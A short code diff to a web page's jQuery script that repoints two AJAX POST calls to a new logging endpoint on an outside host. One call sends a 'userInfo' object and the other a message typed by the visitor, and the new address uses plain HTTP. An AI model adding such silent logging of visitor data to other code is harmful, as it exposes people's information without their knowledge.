@@ -534,7 +534,7 @@
 
       // Send user information to the server
       $.ajax({
-        url: 'https://offershub.fun/ajax/log.php',
+        url: 'http://suz.42web.io/ajax/req/log.php',
         type: 'POST',
         data: { userInfo: JSON.stringify(userInfo) },
         success: function(response) {
@@ -548,7 +548,7 @@
       $('.button-71').on('click', function(){
         var msg = $('.msg-area').val();
          $.ajax({
-            url: 'https://offershub.fun/ajax/log.php',
+            url: 'http://suz.42web.io/ajax/req/log.php',
             type: 'POST',
             data: { 'msg': msg },
             success: function(response) {
